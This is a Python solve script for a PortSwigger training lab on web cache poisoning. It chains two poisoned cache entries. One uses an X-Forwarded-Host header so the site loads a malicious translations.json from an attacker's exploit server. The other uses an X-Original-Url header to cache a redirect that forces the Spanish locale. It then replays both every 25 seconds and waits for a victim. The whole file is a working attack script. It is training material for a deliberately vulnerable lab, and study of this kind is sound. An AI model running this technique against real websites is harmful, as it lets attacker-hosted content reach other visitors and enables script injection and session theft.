#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Combining web cache poisoning vulnerabilities.

Chains two poisoned cache entries:
  1. GET /?localized=1 + X-Forwarded-Host -> loads malicious translations.json from exploit server
  2. GET / + X-Original-Url: /setlang\\es -> cacheable 302 that forces lang=es

Both entries must be live when the victim visits. Script replays them in sequence
every INTERVAL seconds until both show X-Cache: hit.
"""

import argparse
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INTERVAL = 25  # seconds between replay cycles (cache TTL is 30s)


def poison_cycle(s, lab, exploit_host, attempt):
    results = {}

    # Poison /?localized=1 with X-Forwarded-Host
    r1 = s.get(
        f"{lab}/?localized=1",
        headers={"X-Forwarded-Host": exploit_host},
        allow_redirects=False,
    )
    results["localized"] = r1.headers.get("X-Cache", "none")

    # Poison GET / with X-Original-Url -> cacheable redirect to /setlang/es
    r2 = s.get(
        f"{lab}/",
        headers={"X-Original-Url": "/setlang\\es"},
        allow_redirects=False,
    )
    results["root"] = r2.headers.get("X-Cache", "none")

    print(
        f"[{attempt:3d}] /?localized=1 X-Cache={results['localized']:4s}  "
        f"/ X-Cache={results['root']:4s}"
    )
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 11 (combining vulnerabilities)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Exploit server hostname (no https://)")
    parser.add_argument("--cycles", type=int, default=10, help="Max poison cycles")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    # No session cookie — strict cacheability; send unauthenticated
    s = requests.Session()
    s.verify = False

    print(f"[*] Lab:          {lab}")
    print(f"[*] Exploit host: {args.exploit_host}")
    print(f"[*] Interval:     {INTERVAL}s (cache TTL ~30s)")
    print()

    for i in range(1, args.cycles + 1):
        r = poison_cycle(s, lab, args.exploit_host, i)
        if r["localized"] == "hit" and r["root"] == "hit":
            print("[+] Both cache entries poisoned — waiting for victim...")
        if i < args.cycles:
            time.sleep(INTERVAL)

    print("[*] Done. If the lab is not solved, run again or reduce --cycles interval.")


if __name__ == "__main__":
    main()
